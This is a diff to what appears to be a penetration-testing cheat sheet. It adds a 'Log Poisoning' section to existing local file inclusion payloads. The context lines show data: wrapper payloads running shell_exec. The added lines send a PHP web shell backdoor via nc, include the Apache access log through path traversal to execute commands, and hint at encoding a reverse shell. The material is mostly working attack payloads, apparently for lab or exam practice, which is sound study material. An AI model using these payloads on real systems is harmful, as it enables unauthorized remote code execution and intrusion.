@@ -238,6 +238,29 @@ http://192.168.xxx.10/menu.php?file=data:text/plain,<?php echo shell_exec("dir")
 http://192.168.xxx.10/menu.php?file=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCJkaXIiKSA/Pg==
 ```
 
+## Log Poisoning
+
+* submit a request that includes some malicious code
+
+```php
+
+#submit simple php backdoor
+
+nc 10.10.10.xxx 80
+
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+
+```
+
+* trigger malicious log
+
+```bash
+
+http://10.10.10.xxx /menu.php?file=../../../../var/log/apache2/access.log&cmd=whoami
+
+```
+
+* tip: `for reverse shell encode the command as url` in Burp or so
 
 
 ## API
